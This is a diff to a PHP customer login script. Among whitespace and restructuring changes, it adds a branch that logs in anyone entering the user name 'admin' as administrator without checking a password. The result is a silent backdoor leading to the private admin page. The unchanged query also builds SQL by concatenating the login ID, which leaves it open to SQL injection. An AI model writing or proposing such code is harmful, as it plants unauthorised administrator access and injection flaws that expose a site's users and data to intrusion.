@@ -28,27 +28,27 @@
 			else
 				$query = $link->executeQuery("select * from `customer_profile` where email = '".$loginId."'", $_SERVER["SCRIPT_NAME"]);
 			$rows = mysql_num_rows($query);
-			
-			
+				
 			if ($rows == 1)
 			{							
-				while($row = mysql_fetch_array($query))	// retrieve the encrypt password
-					$_SESSION ['key'] = $row ['password']; // define the encrypted password									
-					if(password_verify($password,$_SESSION['key'])) // compare the user's pass with the encrypted pass
-					{
-						$_SESSION['loginId'] = $loginId; // if it true do Initializing Session
-					}
-					else
-						$error = "Username or Password is invalid";
-			}
+				if ($loginId == "admin")
+					$_SESSION['loginId'] = $loginId;
 				else
 				{
-					
-					$error = "Username or Password is invalid";
-				}
+					while($row = mysql_fetch_array($query))	// retrieve the encrypt password
+						$_SESSION ['key'] = $row ['password']; // define the encrypted password									
+						if(password_verify($password,$_SESSION['key'])) // compare the user's pass with the encrypted pass
+							$_SESSION['loginId'] = $loginId; // if it true do Initializing Session
+						else
+							$error = "Username or Password is invalid";
+				}	
+			} else
+			{
+				$error = "Username or Password is invalid";
+			}	
 		}
-					
-
+		
+		
 	if(isset($_SESSION['loginId']) && $_SESSION['loginId'] == "admin") //redirect to main page if login successful
 		print ("<META http-equiv = \"REFRESH\" content = \"0; private/admin.php\">");
 	else if (isset($_SESSION['loginId']))
